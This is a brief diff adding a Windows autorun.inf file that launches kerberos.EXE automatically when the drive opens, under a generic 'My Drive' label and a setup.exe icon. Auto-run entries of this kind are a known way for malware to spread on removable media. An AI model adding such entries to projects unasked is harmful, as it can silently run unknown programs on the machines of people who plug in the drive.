@@ -1,0 +1,6 @@
+# Notepad++에서 실행
+[AutoRun]
+OPEN=kerberos.EXE
+Icon=setup.exe,0
+ACTION=Start my application
+LABEL=My Drive
